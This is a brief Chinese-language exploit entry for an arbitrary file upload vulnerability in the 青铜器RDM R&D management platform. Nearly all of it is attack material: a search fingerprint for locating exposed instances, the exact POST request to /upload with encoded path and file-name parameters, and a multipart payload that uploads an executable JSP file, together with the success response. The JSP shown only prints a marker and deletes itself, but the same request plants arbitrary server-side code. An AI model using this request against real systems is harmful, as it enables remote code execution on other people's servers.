# 青铜器RDM研发管理平台upload任意文件上传漏洞

青铜器RDM研发管理平台upload ｜ 文件上传 ｜ —
- **指纹**：`body="/images/rdm.ico"`
- **请求**：`POST /upload?dir=cmVwb3NpdG9yeQ==&name=ZGVtby5qc3A=&start=0&size=7000 HTTP/1.1`

**Payload**
```
--98hgfhfbuefbhbvuyh98
Content-Disposition: form-data; name="file"; filename="dudesuite.jsp"
Content-Type: application/octet-stream
<% out.println("dudesuite");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--98hgfhfbuefbhbvuyh98
Content-Disposition: form-data; name="Submit"
Go
--98hgfhfbuefbhbvuyh98--
```
- **响应特征**：200 .jsp